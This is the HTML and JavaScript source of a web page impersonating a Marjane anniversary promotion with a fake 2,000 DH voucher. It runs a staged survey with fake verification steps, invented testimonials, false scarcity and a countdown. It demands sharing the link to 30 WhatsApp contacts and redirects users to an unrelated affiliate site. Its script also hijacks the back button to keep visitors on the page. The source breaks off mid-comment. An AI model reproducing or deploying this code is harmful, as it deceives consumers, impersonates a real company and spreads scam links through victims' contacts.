&<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html>
<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
  <head>

   <title>
Marjane: Anniversaire 
    </title>
    <meta content='text/html; charset=utf-8' http-equiv='content-type'/>
    <meta content='width=device-width, initial-scale=1.0' name='viewport'/>
    <meta content='https://i.imgur.com/UOVNrX1.jpg' property='og:image'/>
    <meta content='Marjane: Anniversaire' property='og:title'/>
    <meta content='Bon d’achat gratuit de 2.000 DH' property='og:description'/>
    <meta content='https://www.marjane.ma' property='og:url'/>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-119555838-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-119555838-1');
</script>


<link rel="manifest" href="/manifest.json" />
<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
<script>
  var OneSignal = window.OneSignal || [];
  OneSignal.push(function() {
    OneSignal.init({
      appId: "5bebcb6f-3d67-440a-b009-5279004e3c3f",
    });
  });
</script>
	
    <script src='https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js'>
    </script>
    <script>
      //<![CDATA[
      redirectURL = "";
      WhatsApp_share_message = "";
      Share_link = "#";
      alert_text = "Compartilhe esta oferta com pelo menos 10 amigos para continuar. Você convidou...";
      var timer_start = 5; //minutes
      //]]>
    </script>
    <script type='text/javascript'>
      //<![CDATA[
      var total = 3;
      jQuery(document).ready(function ($) {
        $(".answer").click(function () {
          if($(this).hasClass("anses1")){
            survey.step1();
          }
          if($(this).hasClass("anses2")){
            survey.step2();
          }
          if($(this).hasClass("anses3")){
            survey.step3();
          }
        });
        var clicks = 0;
        var survey = {
          step1: function(){
            setTimeout(function () {
              //hide question block
              $(".question_count").hide();
              $(".question1").hide();
              $(".anses1").hide();
              //show calculating
              $(".calculating").show();
              setTimeout(function () {
                //hide calculating
                $(".calculating").hide();
                //show step 2
                $(".question_count span").html("2");
                $(".question_count").show();
                $(".question2").show();
                $(".anses2").show();
              }, 1200);
            }, 300);
          },
          step2: function(){
            setTimeout(function () {
              //hide question block
              $(".question_count").hide();
              $(".question2").hide();
              $(".anses2").hide();
              //show calculating
              $(".calculating").show();
              setTimeout(function () {
                //hide calculating
                $(".calculating").hide();
                //show step 3
                $(".question_count span").html("3");
                $(".question_count").show();
                $(".question3").show();
                $(".anses3").show();
              }, 1200);
            }, 300);
          },
          step3: function(){
            setTimeout(function () {
              //hide question block
              $(".question_count").hide();
              $(".question3").hide();
              $(".anses3").hide();
              //show calculating
              $(".calculating").show();
              setTimeout(function () {
                //hide calculating
                $(".calculating").hide();
                //show checking part
                $(".survey_middle").css("vertical-align","top");
                $(".loading").show();
                setTimeout(function () {
                  $(".check1").fadeIn(300);
                  setTimeout(function () {
                    $(".check2").fadeIn(300);
                    setTimeout(function () {
                      $(".check3").fadeIn(300);
                      setTimeout(function () {
                        survey.change();
                      }, 1400);
                    }, 1100);
                  }, 1400);
                }, 750);
              }, 600);
            }, 300);
          },
          change: function(){
            //sakrij gornje
            $(".headline,.small_headlines,.timer").hide();
            //sakrij content surveya
            $(".loading").hide();
            $(".survey_outer").css("height","auto");
            //pokazi ostatak
            var walink = "whatsapp://send?text="+WhatsApp_share_message+Share_link;
            //$(".btn-share").attr("href",walink);
            $(".btn-share").click(function(){
              clicks++;
              $('#progreso').show();
              if (clicks > total) {
                window.location = redirectURL;
                return;
              }
              $('.progress span').width(((clicks / total) * 100) + '%');
              if (clicks == total) {
                window.location.href = walink;
              }
              window.location.href = walink;
            });
            $(".last_page").show();
			$(".fbcoms").show();
            waitme();
          }
        };
        $(".like").click(function() {
          if($(this).hasClass("selected")) {
            $(this).removeClass("selected");
            $(this).html("Like");
            $("#youand").html("");
          } else {
            $(this).addClass("selected");
            $(this).html("Unlike");
            $("#youand").html("You and ");
          }
        });
        $(".fblike").click(function() {
          if($(this).hasClass("selected")) {
            $(this).removeClass("selected");
            $(this).html("Like");
          } else {
            $(this).addClass("selected");
            $(this).html("Unlike");
          }
        });
        function waitme(){
          FBcom("#fb1",000);
          FBcom("#fb2",000);
          FBcom("#fb3",000);
          FBcom("#fb4",000);
          FBcom("#fb5",00);
          FBcom("#fb6",000);
          FBcom("#fb7",000);
          FBcom("#fb8",0000);
          var ct = 48;
          (function loop() {
            var rand = random(2500,5500);
            var ctrand = random(1,4);
            ct = ct - ctrand;
            if(ct > 1) {
              setTimeout(function() {
                loop(); 
              }, rand);
            } else {
              ct = "few";
            }
            $("#count").html(ct);
          }());
        }
        function FBcom(a,b) {
          setTimeout(function() {
            var m = 0, n = true, op = 0;
            $(a+", "+a+" .comtxt, "+a+" .combot").slideDown(500);
            $().slideDown(500);
            var t = setInterval(function() {
              op += 0.2;
              $(a).css({"opacity":op});
              m++;
              if(m === 5) clearInterval(t);
            }, 100);
          }, b);
        }
        function random(min, max) {
          return Math.round(Math.random() * (max - min) + min);
        }
        var out,pops = {
          init: function(){
            setTimeout(function () {
              var rand_name = pop_names[random(0,pop_names.length-1)];
              var rand_text = pop_texts[random(0,pop_texts.length-1)];
              var text = rand_name + " " + rand_text;
              $(".pops p").html(text);
              $(".pops").fadeIn(500);
              out = setTimeout(function () {
                $(".pops").fadeOut(1000);
                pops.init();
              }, 6000);
            }, random(6000, 15000));
          }
        };
        pops.init();
        $("#iks").click(function () {
          clearTimeout(out);
          $(".pops").hide();
          pops.init();
        });
        $("#mins").html("0"+timer_start);
        $("#sec").html("00");
        var mins = timer_start, secs = 0, minutes, seconds, timer = {
          init: function(){
            var counter = setInterval(function () {
              $(".timer_heading").addClass("blink");
              setTimeout(function () {
                $(".timer_heading").removeClass("blink");
              }, 500);
              secs--;
              if(secs<0){
                secs = 59;
                mins--;
                if(mins<0){
                  clearInterval(counter);
                  mins = 0;
                  secs = 0;
                  $(".timer_heading").hide();
                  $(".timer .small_headlines").show();
                }
                if(mins<10){
                  minutes = "0" + mins;
                }else{
                  minutes = mins;
                }
              }
              if(secs<10){
                seconds = "0" + secs;
              }else{
                seconds = secs;
              }
              $("#mins").html(minutes);
              $("#sec").html(seconds);
            }, 1000);
          }
        };
        timer.init();
      });
      //]]>
    </script>
    <script type='text/javascript'>
      //<![CDATA[
      var ii = 0; // needed for safari
      var iy = 0;
      if (typeof history.pushState === "function") {
        history.pushState("back", null, null);
        window.onpopstate = function() {
          history.pushState('back', null, null);
          if (iy==3) {
            iy=0;
            window.location='#';
          } else if (ii == 1) {
            document.getElementById('popup1').style.display = "none";
            setTimeout(function() {
              if (document.getElementById('popup1').style.display == "none") {
                document.getElementById('popup1').style.display = "block";
              }
            }, 300);
            window.navigator.vibrate(000);
            iy=iy+1;
          }
        };
      }
      setTimeout(function() {
        ii = 1;
      }, 200);
      function hidepop() {
        document.getElementById('popup1').style.display = "none";
      }
      //]]>
    </script>
 
<style>
@import url('https://fonts.googleapis.com/css?family=Montserrat');
      	
@font-face{
font-family: 'Roboto';
font-weight: 400;
src: url(../fonts/Roboto-Regular.ttf);
}
@font-face{
font-family: 'Roboto';
font-weight: 700;
src: url(../fonts/Roboto-Bold.ttf);
}
@font-face{
font-family: 'Tahoma';
font-weight: 400;
src: url(../fonts/Tahoma.ttf);
}
@font-face{
font-family: 'Tahoma';
font-weight: 700;
src: url(../fonts/Tahoma-Bold.ttf);
}
body,html{
width: 100%;
margin: 0;
font-family: 'Montserrat', sans-serif;
background: #064e98;
}
/*clearfix*/
.clearfix:before, .clearfix:after{content:"";display:table;}
.clearfix:after{clear: both;}
.clearfix{*zoom: 1;}
*{
box-sizing: border-box;
}
p{
margin: 0;
}
.cont_outer{
position: absolute;
display: table;
width: 100%;
height: 100%;
background-image: url(../img/219958493.jpg);
background-position: center top;
background-size: 750px auto;
background-repeat: repeat-y;
}
.bold{
font-weight: 700;
}
/*************************************************** header ***************************************************/
.header{
display: table-row;
width: 100%;
height: 50px;
background-color: #fff;
font-weight: 700;
}
.header-inner{
display: table-cell;
vertical-align: middle;
text-align: center;
}
.header-inner p{
vertical-align: middle;
color: #fff;
font-size: 18px
}
.header-inner p img{
vertical-align: middle;
}
#folder{
width: 28px;
}
#rupee1{
width: 14px;
padding-left: 2px
}
/*************************************************** content ***************************************************/

.content{
display: table-row;
width: 100%;
overflow-x: hidden
}
.content-middle{
display: table-cell;
vertical-align: middle;
width: 100%;
}
.content-inner{
width: 95%;
max-width: 600px;
margin: 5px auto;
text-align: center;
padding: 15px 3px;
border-radius: 4px;
background-color: #cee0f8;
}
#logo{
width: 220px;
}
.headline{
color: #fff;
font-weight: bold;
font-size: 22px;
line-height: 45px
}
.headline,.headline span img{
vertical-align: middle;
}
.headline span{
vertical-align: top;
}
.headline span{
text-decoration: underline;
}
.headline span img{
width: 12px;
margin-left: 3px;
}
.small_headlines{
font-size: 16px;
color: #043767;
font-weight: bold;
padding-bottom: 10px;
}
.small_headlines img{
width: 10px;
margin-left: 3px;
vertical-align: middle;
line-height: 22px;
}
.question2,.question3{
display: none;
}
/*************************************************** survey ***************************************************/
.survey_outer{
display: table;
width: 95%;
margin: 15px auto 0;
background-color: #064e98;
border-radius: 4px;
height: 295px;
}
.survey_middle{
display: table-cell;
vertical-align: middle;
}
.survey_inner{
display: block;
width: 95%;
margin: 0 auto;
padding: 15px 0;
position: relative;
}
.anses2,.anses3{
display: none;
}
.question_count{
color: #fff;
font-size: 24px;
font-weight: 700;
}
.question_text{
color: #fff;
font-size: 20px;
line-height: 38px;
}
.question2{
line-height: 1.2em;
padding: 10px 0 15px;
}
.question3{
line-height: 1.2em;
}
.answer{
width: 80%;
margin: 15px auto;
text-align: center;
padding: 7px 0;
color: #222;
background-color: #fff;
border-radius: 7px;
border: 1px solid #027CD5;
font-size: 24px;
font-weight: 400;
cursor: pointer;
-webkit-transition: all 0.3s ease-in-out;
-moz-transition: all 0.3s ease-in-out;
transition: all 0.3s ease-in-out;
}
.answer:hover{
color: #222;
background-color: #fff;
font-weight: 700;
}
.calculating{
display: none;
vertical-align: middle;
font-size: 28px;
text-transform: uppercase;
color: #fff;
font-weight: 700;
}
.calculating img{
vertical-align: middle;
width: 50px;
}
/****** loading ******/
.loading{
display: none;
text-align: center;
color: #fff;
font-weight: 700;
}
.loading img{
width: 70%;
max-width: 220px;
margin: 0 auto 15px;
}
.load_headline{
font-size: 24px;
margin: 15px 0;
}
.check{
font-size: 20px;
margin: 10px 0;
}
.check1,.check2,.check3{
display: none;
}
/*************************************************** last page ***************************************************/
.last_page{
display: none;
}
.last-up{
text-align: left;
}
.textlastup{
color: #fff;
font-size: 18px;
padding-bottom: 8px;
font-weight: 400;
}
.btn{
width: 80%;
font-size: 28px;
max-width: 345px;
margin: 15px auto;
background-color: #58BE41;
border-radius: 5px;
color: #fff;
font-weight: 700;
text-align: center;
display: block;
padding: 7px 0;
text-decoration: none;
-webkit-transition: all 0.2s ease-in-out;
-moz-transition: all 0.2s ease-in-out;
transition: all 0.2s ease-in-out;
box-shadow: none;
}
.btn:hover{
background-color: #fff;
color: #58BE41;
box-shadow: 0 0 2px #58BE41,
0 0 5px #58BE41,
0 0 7px #58BE41,
0 0 11px #58BE41;
}
.btn-share{
font-size: 24px;
background-color: #58BE41;
background-size: 40px auto;
background-position: left 5px top 1px;
background-repeat: no-repeat;
}

.progress {      width:80%;      height: 20px;  /* Can be anything */      position: relative;      margin: 60px 0 20px 0; /* Just for demo spacing */      background: #555;      padding: 10px;      -webkit-box-shadow: inset 0 -1px 1px rgba(255,255,255,0.3);      -moz-box-shadow   : inset 0 -1px 1px rgba(255,255,255,0.3);      box-shadow        : inset 0 -1px 1px rgba(255,255,255,0.3);      margin: auto;    }    .progress > span {      display: block;      height: 20px;	  left: 0;	  top: 0;      background-color: #3F51B5;      background-image: -webkit-gradient(         linear,         left bottom,         left top,         color-stop(0, #00BCD4),         color-stop(1, #2196F3)        );      background-image: -moz-linear-gradient(        center bottom,        rgb(43,194,83) 37%,        rgb(84,240,84) 69%       );      -webkit-box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      -moz-box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      box-shadow:         inset 0 2px 9px  rgba(255,255,255,0.3),        inset 0 -2px 6px rgba(0,0,0,0.4);      position: absolute;      overflow: hidden;    }    .progress > span:after, .animate > span > span {      content: "";      position: absolute;      top: 0; left: 0; bottom: 0; right: 0;      background-image:          -webkit-gradient(linear, 0 0, 100% 100%,             color-stop(.25, rgba(255, 255, 255, .2)),             color-stop(.25, transparent), color-stop(.5, transparent),             color-stop(.5, rgba(255, 255, 255, .2)),             color-stop(.75, rgba(255, 255, 255, .2)),             color-stop(.75, transparent), to(transparent)         );      background-image:         -moz-linear-gradient(          -45deg,             rgba(255, 255, 255, .2) 25%,             transparent 25%,             transparent 50%,             rgba(255, 255, 255, .2) 50%,             rgba(255, 255, 255, .2) 75%,             transparent 75%,             transparent         );      z-index: 1;      -webkit-background-size: 50px 50px;      -moz-background-size: 50px 50px;      -webkit-animation: move 2s linear infinite;         -webkit-border-top-right-radius: 8px;      -webkit-border-bottom-right-radius: 8px;             -moz-border-radius-topright: 8px;          -moz-border-radius-bottomright: 8px;                 border-top-right-radius: 8px;              border-bottom-right-radius: 8px;          -webkit-border-top-left-radius: 20px;       -webkit-border-bottom-left-radius: 20px;              -moz-border-radius-topleft: 20px;           -moz-border-radius-bottomleft: 20px;                  border-top-left-radius: 20px;               border-bottom-left-radius: 20px;      overflow: hidden;    }        .animate > span:after {      display: none;    }        @-webkit-keyframes move {        0% {           background-position: 0 0;        }        100% {           background-position: 50px 50px;        }    }




.btn-down{
font-size: 24px;
text-transform: uppercase;
}
/*************************************************** facecomms ***************************************************/
/* COMMENTS */
.fbcoms {
font-family: Tahoma, Verdana, sans-serif;
background-color: #fff;
width: 100%;
margin: 0 auto;
padding: 5px 10px;
font-size: 12px;
text-align: left;
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
box-sizing: border-box;
}
.comments {
font-weight: bold;
text-align: center;
padding: 0 5px 10px 5px;
}
.totlikes {
margin-top: 3px;
background-color: #eeeff4;
padding: 5px 5px 5px 23px;
background-image: url("../img/f/like.png");
background-repeat: no-repeat;
background-position: 5px center;
}
.fbblue {
color: #3c5a96;
}
.buttons {
padding-bottom: 5px;
font-family: Arial, sans-serif;
color: #7d7d7f;
}
.buttons span {
cursor: pointer;
}
.buttons span:hover {
text-decoration: underline;
}
.viewmore {
margin-top: 3px;
background-color: #eeeff4;
padding: 5px 5px 5px 23px;
background-image: url("../img/f/bubble.png");
background-position: 5px center;
background-repeat: no-repeat;
}
.left {
cursor: pointer;
float: left;
color: #3c5a96;
}
.left:hover {
text-decoration: underline;
}
.right {
color: #7d7d7f;
float: right;
}
.item {
position: relative;
margin-top: 3px;
background-color: #eeeff4;
padding: 5px 5px 5px 60px;
min-height: 60px;
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
box-sizing: border-box;
}
.item .profileimg {
position: absolute;
top: 5px;
left: 5px;
}
.comtxt {
line-height: 16px;
}
.name {
color: #3c5a96;
font-weight: bold;
}
.ago {
color: #86878c;
font-size: 0.95em;
}
.fblike {
color: #3c5a96;
font-size: 0.95em;
cursor: pointer;
}
.fblike:hover {
text-decoration: underline;
}
.combot {
padding-top: 5px;
}
.clickhere {
font-weight: bold;
padding: 30px 10px 5px;
line-height: 18px;
}
.likes {
color: #3c5a96;
font-size: 0.95em;
cursor: pointer;
}
.fbimg {
background-color: #fff;
border-radius: 2px;
-moz-border-radius: 2px;
-webkit-border-radius: 2px;
max-width: 210px;
width: 100%;
padding: 3px;
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
box-sizing: border-box;
border: 1px solid #808080;
margin: 10px 0 5px;
}
.hidden {
display: none;
opacity: 0;
}
.hidden .comtxt, .hidden .combot, .comments {
display: none;
}
.answer{
cursor: pointer;
}
/*************************************************** pops ***************************************************/
.pops{
position: fixed;
top: 80px;
right: 10px;
display: none;
width: 230px;
margin: 10px 10px 0 0;
background-color: rgba(173,176,192,0.8);
width: 230px;
border-radius: 8px;
box-shadow: 0 0 7px #888888;
padding-bottom: 3px
}
#piplovi{
width: 55px;
margin: 0;
padding: 5px;
float: left;
}
#iks{
position: absolute;
top: -10px;
right: -10px;
width: 20px;
cursor: pointer;
}
.pops p{
width: 170px;
padding: 2px;
padding-top: 10px;
margin-left: 50px;
font-size: 14px;
color: #fff;
word-spacing: 0;
line-height: 100%;
}
/*************************************************** timer ***************************************************/
.timer .small_headlines{
display: none;
}
.timer_heading{
width: 80%;
margin: 0 auto;
font-size: 16px;
color: #555;
font-weight: 400;
padding-bottom: 10px;
}
@-webkit-keyframes bllink{
from{
color: #fff;
text-shadow: none;
transform: scale(1,1);
}
to{
color: #ff0000;
text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
transform: scale(1.3,1.3);
}
}
@-moz-keyframes bllink{
from{
color: #fff;
text-shadow: none;
transform: scale(1,1);
}
to{
color: #ff0000;
text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
transform: scale(1.3,1.3);
}
}
@keyframes bllink{
from{
color: #fff;
text-shadow: none;
transform: scale(1,1);
}
to{
color: #ff0000;
text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
transform: scale(1.3,1.3);
}
}
.blink{
-webkit-animation: 0.2s bllink ease-in-out alternate;
-moz-animation: 0.2s bllink ease-in-out alternate; 
animation: 0.2s bllink ease-in-out alternate;
}
/*************************************************** media ***************************************************/
@media screen and (max-width: 600px){
.cont_outer{
background-size: 600px auto;
}
.headline{
font-size: 18px;
}
.small_headlines,.timer_heading{
font-size: 13px;
}
}
@media screen and (max-width: 500px){
.btn{
width: 90%;
max-width: 345px;
}
}
@media screen and (max-width: 400px)
.header-inner p{
font-size: 14px;
}
#rupee1{
width: 12px;
padding-left: 2px
}
.header{
height: 40px;
}
.answer{
margin: 10px auto;
padding: 5px 0;
border-radius: 7px;
border: 1px solid #027CD5;
font-size: 20px;
color: #222;
font-weight: 700;
}
.survey_outer{
height: 250px;
}
.calculating{
font-size: 22px;
}
.load_headline{
font-size: 20px;
margin: 15px 0;
}
.check{
font-size: 16px;
margin: 10px 0;
}
.textlastup{
font-size: 16px;
padding-bottom: 5px;
font-weight: 400;
}
.btn{
width: 100%;
max-width: 345px;
}
.btn-share{
font-size: 20px;
background-size: 36px auto;
}
.btn-down{
font-size: 20px;
}
}	#main-frame-error{display:none;height:auto}.interstitial-wrapper{padding-top:10px;box-sizing:border-box;font-size:1em;line-height:18px;margin:auto;max-width:600px;width:90%}#today{float:right;font-weight:600;padding-top:15px}#main-message>p{display:inline}#blink{color:#f00;padding:6px;-webkit-animation:blink 1s infinite;-moz-animation:blink 1s infinite;-ms-animation:blink 1s infinite;-o-animation:blink 1s infinite;animation:blink 1s infinite}@-webkit-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-moz-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-ms-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}}@-o-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}#theTime{font-size:18px;font-weight:bold;color:red;font-family:sans-serif}h1{color:#000;font-size:1.6em;line-height:1.25em;margin-bottom:16px}#alertimg{height:26px;width:26px;position:absolute;top:13px;left:17px}.popup{display:none;position:absolute;top:20%;left:50%;width:88%;max-width:280px;margin:0 0 0 -140px;font-size:1em;border-radius:4px;background-color:#282828;color:#fff;overflow:hidden;box-shadow:1px 1px 7px #000;z-index:100}.popup-head{background-color:#282828;padding:18px 16px 18px 55px;border-bottom:2px solid #33b4e4;color:#33b4e4;line-height:normal}.popup-center{padding:20px 16px;color:#f3f3f3;line-height:20px}.popup-bottom{background-color:#282828;padding:9px 6px;text-align:center;border-top:1px solid #474747;overflow:hidden}.popup-bottom .button{display:block;height:30px;width:128px;margin:0 auto;font-size:1.1em;color:#f3f3f3;border-radius:3px;cursor:pointer;text-decoration:none;padding:0;line-height:30px}

a {
text-decoration: none;
}

</style>
  </head>
  <body>

    
    <div class='popup fourth' id='popup1' style='display:none'>
      <div class='popup-head'>
        Avis! <img alt='' height='26' id='alertimg' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAaAQMAAACThN6NAAAABlBMVEUAAAC5ubnoUmKJAAAAAXRSTlMAQObYZgAAAEVJREFUCNdjQAI8cEIOTtiDiPoGGPH5AIh4wMDA+PkDAwMzhPjBwMAOIvg//4ES8v//AbV+/g8l6v//b4AQ////P8CACgCNvyHz1VKxBQAAAABJRU5ErkJggg==' width='26'/>
            
      </div>
      <div class='popup-center'>
     Pour obtenir le bon d’achat, suivez les instructions.
      </div>
      <div class='popup-bottom'>
        <div class='button' onclick='hidepop();'>
          OK
        </div>
      </div>
    </div>
    <div class='content'>
      <!-- content -->
      <div class='content-middle'>
        <div class='content-inner'>
          <img src='top.jpg' width='100%'/><br/>
<center>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 320x100 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:320px;height:100px"
     data-ad-client="ca-pub-7432523172737487"
     data-ad-slot="7131977308"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>


</center>
<br/>
          <p class='headline'>
          </p>
          <p class='small_headlines'><b>
Félicitations !! Vous avez été sélectionné afin de participer à un sondage anonyme pour recevoir un bon gratuit Marjane de 2000 DH .
<br/><br/>
Faites vite, il ne reste plus que 123 bons disponibles.
</b>

            
          </p>


<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 320x100 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:320px;height:100px"
     data-ad-client="ca-pub-7432523172737487"
     data-ad-slot="7131977308"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>




          <br/>
          <br/>
          
          <div class='survey_outer'>
            <div class='survey_middle'>
              <div class='survey_inner'>
              <!--  <p class='question_count'>
                 Pergunta
                  <span>
                    1
                  </span>
               de 3
                </p> -->
                <p class='question_text question1'>
                1°: Connaissez-vous le Supermarché Marjane?
  

                </p>
                <p class='question_text question2'>
                 
            2°: Avez -vous déjà fait vos courses au supermarché Marjane?


                </p>
                <p class='question_text question3'>
             3°: Recommanderiez-vous Marjane aux parents et aux amis?
                </p>
                <div class='ans-box'>
                  <div class='answer anses1'>
                    <p>
                      Oui
                    </p>
                  </div>
                  <div class='answer anses1'>
                    <p>
                      Non
                    </p>
                  </div>
              
                  <div class='answer anses2'>
                    <p>
                      Oui 
                    </p>
                  </div>
                  <div class='answer anses2'>
                    <p>
                      Non
                    </p>
                  </div>
                  <div class='answer anses3'>
                    <p>
                      Oui
                    </p>
                  </div>
                  <div class='answer anses3'>
                    <p>
                      Non
                    </p>
                  </div>
                </div>
                
                <p class='calculating'>
                  <img alt='' src='https://media.giphy.com/media/8DcYkij7pUxUY/giphy.gif'/>
                  ATTENDRE S'IL VOUS PLAÎT…
                </p>
                <div class='loading'>
                  <p class='load_headline'>
               Attendre s'il vous plaît...
                  </p>
                  <img alt='' src='https://media.giphy.com/media/3o7TKtnuHOHHUjR38Y/source.gif' style='height:50px;width:50px;'/>
                  <p class='check check1'>
                 Vérification...

                  </p>
                  <p class='check check2'>
              Vérification...
                  </p>
                  <p class='check check3'>
                Félicitations, vous avez gagné un bon d’achat Marjane.
                  </p>
                </div>
                <div class='last_page'>
                  <div class='last-up'>
                    <h4 class='textlastup'>
Félicitations!<br/>
Vous avez gagné 1 bon d’achat Marjane!
<br/><br/>

Comment obtenir votre bon d’achat Marjane:<br/>
1.Partager avec 30 de vos amis/groupes WhatsApp (Cliquez sur l'icône WhatsApp).
<br/><br/>
2.Après le partage, vous serez automatiquement redirigé pour obtenir votre bon d’achat Marjane gratuit.<br/>
3.Vous recevrez votre bon dans 5 minutes.
</h4>
<script type="text/javascript">

	var STRONG = {
		share: 3
	};

	function shared(p){		
		ga('send', 'event', 'Youtube', 'Share ' + p, 'Converted');
	}
      
	  function incrementValue()
      {
        var value = parseInt(document.getElementById('number').value, 10);
        value = isNaN(value) ? 0 : value;
        value++;
        shared(value);
        document.getElementById('number').value = value;
		
        var value = parseInt(document.getElementById('number').value, 10);
        if(value>= STRONG.share){
          window.location="http://www.greatmobilegames.mobi/?sl=3332318-a5be1&data1=Track1&data2=Track2&tag={External_ID_from_traffic_source}&website={subID}&placement={sub_subID}";
        }else{
			//alert("Você compartilhou com "+value+" Amigos. São no mínimo 15 compartilhamentos!");
        }
		
		
      }
	  
function fn1() {
	STRONG.count = true;
	var value = parseInt(document.getElementById('number').value, 10);
	value = value + 1;	
	document.querySelector('.progress').style.display = "block";
	var inicio = 100;
	var divisor = STRONG.share;
	var porsiento = inicio / divisor;
	var estatico = porsiento;
	var obtenido = parseInt(estatico * value);
	document.querySelector('.progress span').style['width'] = obtenido + "%";
	document.querySelector('.progress span').style['width'] = obtenido + "%";


}
</script>


<a href='whatsapp://send?text=*Marjane* 🇲🇦 pour son Anniversaire donne à tout le monde des bons d’achats gratuits de 2.000 DH. Faites vite, les bons d´achats sont limités %0A

https://bons-dachats.top/m-marjane' onclick='incrementValue()' target='_blank'>
<button class='btn btn-primary' onclick='fn1()' type='button'>WhatsApp</button></a>
                    <input id='number' type='hidden' value='0'/>
<h4 class='textlastup'>
 Partager jusqu'à ce que la ligne ne sera pas rempli:</h4>

<div class='progress'>
				<span aria-valuemax='100%' aria-valuemin='1%' aria-valuenow='1' id='progressbar' style='width: 1%; max-width: 100%;'/>
			</div>

                
                  </div>
  
                  
                  <hr/>
				  </div></div></div></div>
				  <br/>
				  <center>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 320x100 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:320px;height:100px"
     data-ad-client="ca-pub-7432523172737487"
     data-ad-slot="7131977308"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
    </center>
	<br/>
                  <div class='fbcoms' style="display:none;">
                    <p class='comments'>
                    </p>
                    <p class='buttons'>
                      <span class='like'>
                        J’aime
                      </span>
                      &#183; 
                      <span>
                        Commenter     
                      </span>
                      &#183; 
                      <span>
                        Partager
                      </span>
                      &#183; 
                      <span>
                        Partager
                      </span>
                    </p>
                    <p class='totlikes'>
                      <span id='youand'>
                      </span>
                      <span class='fbblue'>
                        5322 et 5 outres personnes

                      </span>
                      like this
                    </p>
                    <p class='viewmore clearfix'>
                      <span class='left'>
                        Больше
                      </span>
                      <span class='right'>
                   50 de 120,310
                      </span>
                      <br/>
                    </p>
                    <div class='item hidden' id='fb8' style='display: none; opacity: 1;'>
                      <img class='profileimg' height='50' src='https://i.imgur.com/CicMV6Y.jpg' width='50'/>
                      <p class='comtxt' style='display: block;'>
                        <span class='name'>
                       Ludivine Orinel
                        </span>
                        <br/>
                    Salut! J'ai reçu mon bon hier après-midi! Merci beaucoup à Marjane.



                      </p>
                      <p class='combot' style='display: block;'>
                        <span class='ago'>
                         il y a 2 minutes
                        </span>
                        &#183; 
                        <span class='fblike'>
                          Like
                        </span>
                      </p>
                    </div>
                    <div class='item hidden' id='fb7' style='display: none; opacity: 1;'>
                      <img class='profileimg' height='50' src='https://i.imgur.com/lNPofv3.jpg' width='50'/>
                      <p class='comtxt' style='display: block;'>
                        <span class='name'>
                         Roxane Greenwood 
                        </span>
                        <br/>
                 Suuuuper!! Au début, je pensais que c'était une plaisanterie,  ou quelque chose de ce genre...mais c'est tout vrai 🤓 
                      </p>
                      <p class='combot' style='display: block;'>
                        <span class='ago'>
                          il y a 6 minutes
                        </span>
                        &#183; 
                        <span class='fblike'>
                          Like
                        </span>
                      </p>
                    </div>
                    <div class='item hidden' id='fb6' style='display: none; opacity: 1;'>
                      <img class='profileimg' height='50' src='https://i.imgur.com/MFEsfnq.jpg' width='50'/>
                      <p class='comtxt' style='display: block;'>
                        <span class='name'>
                         Stephanie Abboud 
                        </span>
                        <br/>
                    Salut!!! Je suis une mère et je remercie Marjane de penser à toutes les families.
                      </p>
                      <p class='combot' style='display: block;'>
                        <span class='ago'>
                          il y a 7 minutes
                        </span>
                        &#183; 
                        <span class='fblike'>
                          Like
                        </span>
                      </p>
                    </div>
                    <div class='item hidden' id='fb5' style='display: none; opacity: 1;'>
                      <img class='profileimg' height='50' src='https://i.imgur.com/N42335a.jpg' width='50'/>
                      <p class='comtxt' style='display: block;'>
                        <span class='name'>
                        Olivier PN
                        </span>
                        <br/>
                        Pour recevoir le bon d’achat vous devez partager avec des amis sur WhatsApp, j'ai reçu le mien! 
                      </p>
                      <p class='combot' style='display: block;'>
                        <span class='ago'>
                          il y a 8 minutes
                        </span>
                        &#183; 
                        <span class='fblike'>
                          Like
                        </span>
                      </p>
                    </div>
                    <div class='item hidden' id='fb4' style='display: none; opacity: 1;'>
                      <img class='profileimg' height='50' src='https://i.imgur.com/fnf8kzy.jpg' width='50'/>
                      <p class='comtxt' style='display: block;'>
                        <span class='name'>
